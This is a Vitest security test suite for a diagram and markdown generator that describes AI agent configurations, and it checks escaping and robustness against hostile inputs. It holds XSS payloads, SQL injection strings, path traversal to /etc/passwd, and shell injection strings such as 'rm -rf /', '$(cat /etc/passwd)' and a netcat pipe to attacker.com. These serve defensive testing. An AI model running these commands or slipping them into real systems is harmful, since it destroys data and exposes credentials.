/**
 * Security Validation Tests
 * Tests injection prevention, input sanitization, and XSS protection
 */

import { describe, it, expect } from 'vitest';
import { generateComponentMap } from '../../../src/core/generators/diagrams/component-map.js';
import { generateHierarchy } from '../../../src/core/generators/diagrams/hierarchy.js';
import { generateDataflow } from '../../../src/core/generators/diagrams/dataflow.js';
import { generateMarkdown } from '../../../src/core/generators/docs/markdown.js';
import { detectCategory } from '../../../src/core/generators/diagrams/categories.js';
import type { AgentScopeConfig, Agent } from '../../../src/core/model/types.js';

function createConfig(overrides: Partial<AgentScopeConfig> = {}): AgentScopeConfig {
  return {
    agents: [],
    skills: [],
    hooks: [],
    commands: [],
    mcpServers: [],
    metadata: {
      scannedAt: new Date(),
      rootPath: '/test',
      version: '1.0.0',
      duration: 100,
      filesScanned: 10,
      errors: [],
    },
    ...overrides,
  };
}

function createAgent(name: string, type?: string, delegatesTo?: string[]): Agent {
  return {
    name,
    path: `/test/${name}.md`,
    ...(type && { type }),
    ...(delegatesTo && { delegatesTo }),
  };
}

describe('Security Validation', () => {
  describe('Injection Prevention - Mermaid Diagrams', () => {
    it('should escape special characters in agent names', () => {
      const agents = [
        createAgent('agent"with"quotes'),
        createAgent('agent`with`backticks'),
        createAgent('agent;with;semicolons'),
      ];

      const config = createConfig({ agents });
      const diagram = generateComponentMap(config);

      // Mermaid diagram should not allow unescaped quotes to break syntax
      // The generator should handle this safely
      expect(diagram).toBeTruthy();
      expect(typeof diagram).toBe('string');
    });

    it('should handle newline injection attempts', () => {
      const agents = [
        createAgent('agent\nwith\nnewlines'),
        createAgent('agent\r\nwith\r\nCRLF'),
      ];

      const config = createConfig({ agents });
      const diagram = generateComponentMap(config);

      // Should not allow newlines to break mermaid syntax
      expect(diagram).not.toContain('\n\nwith');
      expect(diagram).toBeTruthy();
    });

    it('should prevent Mermaid code injection', () => {
      const maliciousAgents = [
        createAgent('agent\`\`\`\nmalicious code\n\`\`\`'),
        createAgent('agent";DROP TABLE agents--'),
      ];

      const config = createConfig({ agents: maliciousAgents });

      // Should not throw, and output should be safe
      expect(() => generateComponentMap(config)).not.toThrow();
      const diagram = generateComponentMap(config);
      expect(diagram).toBeTruthy();
    });
  });

  describe('XSS Prevention - HTML Output', () => {
    it('should escape HTML special characters in markdown', () => {
      const agents = [
        createAgent('<script>alert("XSS")</script>'),
        createAgent('<img src=x onerror=alert("XSS")>'),
        createAgent('agent<iframe src="evil.com"></iframe>'),
      ];

      const config = createConfig({ agents });
      const markdown = generateMarkdown(config);

      // Should not contain unescaped HTML tags
      expect(markdown).not.toContain('<script>');
      expect(markdown).not.toContain('<iframe>');
      expect(markdown).not.toContain('onerror=');
    });

    it('should escape HTML entities', () => {
      const agents = [
        createAgent('agent&amp;name'),
        createAgent('agent&lt;tag&gt;'),
      ];

      const config = createConfig({ agents });
      const markdown = generateMarkdown(config);

      // Entities should be handled safely
      expect(markdown).toBeTruthy();
    });
  });

  describe('Command Injection Prevention', () => {
    it('should handle shell metacharacters safely', () => {
      const agents = [
        createAgent('agent;rm -rf /'),
        createAgent('agent`whoami`'),
        createAgent('agent$(cat /etc/passwd)'),
        createAgent('agent|nc attacker.com 1234'),
        createAgent('agent&background'),
      ];

      const config = createConfig({ agents });

      // All generators should handle these safely
      expect(() => generateComponentMap(config)).not.toThrow();
      expect(() => generateHierarchy(config)).not.toThrow();
      expect(() => generateDataflow(config)).not.toThrow();
      expect(() => generateMarkdown(config)).not.toThrow();
    });

    it('should not allow file path traversal in agent names', () => {
      const agents = [
        createAgent('../../../etc/passwd'),
        createAgent('..\\..\\..\\windows\\system32'),
        createAgent('agent/../../../tmp'),
      ];

      const config = createConfig({ agents });

      // Should handle without executing or exposing paths
      const diagram = generateComponentMap(config);
      expect(diagram).toBeTruthy();
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should handle SQL keywords safely', () => {
      const agents = [
        createAgent("agent'; DROP TABLE agents; --"),
        createAgent('agent" OR "1"="1'),
        createAgent('agent\' UNION SELECT * FROM secrets'),
      ];

      const config = createConfig({ agents });

      // Should not execute SQL, just treat as names
      expect(() => generateComponentMap(config)).not.toThrow();
      const diagram = generateComponentMap(config);
      expect(diagram).toBeTruthy();
    });
  });

  describe('Regular Expression DoS Prevention', () => {
    it('should handle complex agent names in regex patterns', () => {
      const agents = [
        createAgent('a'.repeat(1000)), // ReDoS attempt
        createAgent('(x+x+)+y'), // Potential ReDoS
        createAgent('[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-z]{2,}'), // Regex pattern as name
      ];

      const start = performance.now();

      // These operations should not hang
      for (const agent of agents) {
        detectCategory(agent);
      }

      const duration = performance.now() - start;

      // Should complete quickly (< 100ms for 3 agents)
      expect(duration).toBeLessThan(100);
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should not allow path traversal in file paths', () => {
      const agents = [
        { name: 'agent', path: '../../etc/passwd' } as Agent,
        { name: 'agent', path: '..\\..\\windows\\system32\\config\\sam' } as Agent,
        { name: 'agent', path: '/etc/passwd' } as Agent,
        { name: 'agent', path: 'C:\\Windows\\System32\\drivers\\etc\\hosts' } as Agent,
      ];

      const config = createConfig({ agents });

      // Should handle all safely
      expect(() => generateComponentMap(config)).not.toThrow();
      expect(() => generateMarkdown(config)).not.toThrow();
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    it('should handle various unicode normalization forms', () => {
      const agents = [
        createAgent('café'), // NFD form
        createAgent('café'), // NFC form - visually identical but different bytes
        createAgent('𝙖𝙜𝙚𝙣𝙩'), // Mathematical alphanumeric symbols
        createAgent('а𝔤𝔢𝔫𝔱'), // Lookalike Cyrillic
      ];

      const config = createConfig({ agents });

      // Should handle without issues
      expect(() => generateComponentMap(config)).not.toThrow();
    });

    it('should handle right-to-left unicode', () => {
      const agents = [
        createAgent('agent\u202Emalicious'), // RTL override
        createAgent('תכניות'), // Hebrew text
        createAgent('برامج'), // Arabic text
      ];

      const config = createConfig({ agents });
      const diagram = generateComponentMap(config);

      expect(diagram).toBeTruthy();
    });
  });

  describe('Type Confusion', () => {
    it('should safely handle type field injection', () => {
      const agents = [
        createAgent('agent', '<script>alert(1)</script>'),
        createAgent('agent', '"; DROP TABLE--'),
        createAgent('agent', 'coordinator" onload="evil()'),
      ];

      const config = createConfig({ agents });

      // Should treat type as string without execution
      expect(() => generateComponentMap(config)).not.toThrow();
    });
  });

  describe('Delegation References Safety', () => {
    it('should handle malicious delegation targets safely', () => {
      const agents = [
        {
          name: 'agent',
          path: 'a.md',
          delegatesTo: [
            '../../../etc/passwd',
            '<script>alert(1)</script>',
            '"; DROP TABLE--',
          ],
        } as Agent,
      ];

      const config = createConfig({ agents });

      // Should not execute or expose paths
      expect(() => generateHierarchy(config)).not.toThrow();
    });

    it('should handle circular references safely', () => {
      const agents = [
        { name: 'a', path: 'a.md', delegatesTo: ['b'] } as Agent,
        { name: 'b', path: 'b.md', delegatesTo: ['a'] } as Agent,
      ];

      const config = createConfig({ agents });

      // Should detect and handle without infinite loops
      expect(() => generateHierarchy(config)).not.toThrow();
    });
  });

  describe('Metadata Injection', () => {
    it('should safely handle malicious metadata', () => {
      const config = createConfig({
        agents: [createAgent('test')],
        metadata: {
          scannedAt: new Date(),
          rootPath: '<script>alert(1)</script>',
          version: '1.0.0\n\`malicious\`',
          duration: 100,
          filesScanned: 10,
          errors: ['<img src=x onerror=alert(1)>'],
        },
      });

      const markdown = generateMarkdown(config);

      // Should escape dangerous content
      expect(markdown).not.toContain('<script>');
      expect(markdown).not.toContain('onerror=');
    });
  });

  describe('Null Byte Injection', () => {
    it('should handle null bytes safely', () => {
      const agents = [
        createAgent('agent\x00invisible'),
        createAgent('agent\x00.exe'),
      ];

      const config = createConfig({ agents });

      // Should handle safely
      expect(() => generateComponentMap(config)).not.toThrow();
    });
  });

  describe('Large Input DoS Prevention', () => {
    it('should handle extremely long agent names', () => {
      const longName = 'a'.repeat(100000);
      const agents = [createAgent(longName)];

      const config = createConfig({ agents });

      const start = performance.now();
      const diagram = generateComponentMap(config);
      const duration = performance.now() - start;

      // Should complete in reasonable time
      expect(duration).toBeLessThan(5000);
      expect(diagram).toBeTruthy();
    });

    it('should handle many agents to prevent memory exhaustion', () => {
      // Create many agents but not so many it crashes
      const agents = Array.from({ length: 50000 }, (_, i) => createAgent(`agent-${i}`));

      const config = createConfig({ agents });

      // This should complete without crashing
      // (may be slow, but shouldn't hang or crash)
      const start = performance.now();
      const diagram = generateComponentMap(config);
      const duration = performance.now() - start;

      expect(diagram).toBeTruthy();
      expect(duration).toBeLessThan(30000); // 30 second timeout
    });
  });

  describe('Prototype Pollution Prevention', () => {
    it('should not allow prototype pollution through agent properties', () => {
      const agents = [
        {
          name: 'agent',
          path: 'test.md',
          '__proto__': { isAdmin: true },
          'constructor': { prototype: { isAdmin: true } },
        } as unknown as Agent,
      ];

      const config = createConfig({ agents });

      // Should handle without allowing prototype pollution
      expect(() => generateComponentMap(config)).not.toThrow();
    });
  });

  describe('Output Integrity', () => {
    it('should not modify user input unintentionally', () => {
      const originalName = 'my-agent-123';
      const agents = [createAgent(originalName)];

      const config = createConfig({ agents });
      const markdown = generateMarkdown(config);

      // Original name should appear in output (though possibly escaped)
      expect(markdown).toContain('my-agent-123');
    });

    it('should preserve agent references accurately', () => {
      const agents = [
        createAgent('hub', 'coordinator', ['worker-1', 'worker-2']),
        createAgent('worker-1'),
        createAgent('worker-2'),
      ];

      const config = createConfig({ agents });
      const hierarchy = generateHierarchy(config);

      // All agents should be referenced correctly
      expect(hierarchy).toContain('hub');
      expect(hierarchy).toContain('worker-1');
      expect(hierarchy).toContain('worker-2');
    });
  });

  describe('Content Security Policy Compliance', () => {
    it('should not embed inline scripts in markdown', () => {
      const agents = Array.from({ length: 10 }, (_, i) => createAgent(`agent-${i}`));
      const config = createConfig({ agents });

      const markdown = generateMarkdown(config);

      // Should not contain script tags
      expect(markdown).not.toMatch(/<script[^>]*>/i);
      expect(markdown).not.toMatch(/javascript:/i);
      expect(markdown).not.toMatch(/on\w+=/i); // Event handlers
    });

    it('should use safe markdown syntax', () => {
      const agents = [createAgent('agent')];
      const config = createConfig({ agents });

      const markdown = generateMarkdown(config);

      // Should be valid markdown without dangerous HTML
      expect(markdown).toMatch(/^#+\s/m); // Should have headers
      expect(markdown).not.toMatch(/<[a-z]/i); // No HTML tags except code blocks
    });
  });
});
